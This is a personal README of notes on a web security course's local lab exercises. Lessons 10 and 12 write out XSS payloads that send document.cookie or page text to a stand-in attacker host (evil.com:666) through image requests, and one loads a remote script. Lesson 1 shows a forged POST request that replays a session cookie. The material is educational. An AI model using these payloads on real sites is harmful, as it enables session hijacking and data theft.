# Web Security Essentials

The code in this repository is based on the
[Web Security Essentials](https://egghead.io/lessons/express-course-overview-web-security-essentials)
course.
The preceding repository was also forked to
[this repo](https://github.com/carltonj2000/web-security-essentials)

## Setup

From the repository link in the above section, did the following:

- Used the code from `./exercises/01` as the starter code.
  - deleted `_INSTRUCTIONS.md` and `_SOLUTIONS.md`.
- Copied `./package.json` and ran `npm install` to install the dependencies.
- Ran `npm run start` and verified `http://localhost.charlesproxy.com`.
- Ran `npm run start:evil.com` and verified `https://evil.com:666`.
- Notes from each lessons follows in reverse chronological order.
- [Git hub repo](https://github.com/carltonj2000/web-sec-ess)
  created with all content note above.

## Lesson 12

---

<script src="https://evil.com:666/hijack.js"></script>

---

## Lesson 12

---

<script>
  var data = document.body.innerText;
  console.log(data);
  var payload = encodeURIComponent(data);
  var img = new Image();
  img.src = `https://evil.com:666/hijack?payload=${payload}`;
</script>

---

## Lesson 10

---

<script>
  var payload = encodeURIComponent(document.cookie);
  var img = new Image();
  img.src = `https://evil.com:666/hijack?payload=${payload}`;
</script>

---

## Lesson 1

In the `./exercises/01` ran `npm start` and `npm run start:evil.com`.
Use `proxyman` to capture a post request from `localhost.charlesproxy.com` and
modified the following lines to post a custom message. Deleted the proxy line.

---

-H 'Content-Length: 13' \
--proxy http://localhost:9090 \
-d 'message=hello'

---

---

curl 'http://localhost.charlesproxy.com/' \
-X POST \
-H 'Accept: _/_' \
-H 'Host: localhost.charlesproxy.com' \
-H 'Accept-Language: en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7' \
-H 'Referer: http://localhost.charlesproxy.com/' \
-H 'Content-Length: 24' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36' \
-H 'Origin: http://localhost.charlesproxy.com' \
-H 'Proxy-Connection: keep-alive' \
--cookie '\_ga=GA1.2.761887530.1582043871; \_gid=GA1.2.218915999.1582043871; connect.sid=s%3AzLtpL8zTUgQLX0EwsUX9uMuHwZTezm-z.pxrPgt%2BNCyiV678Gz%2BUUOfuUUhRXl%2FWuW2PyH204oLk' \
-d 'message=carlton+was+here'

---
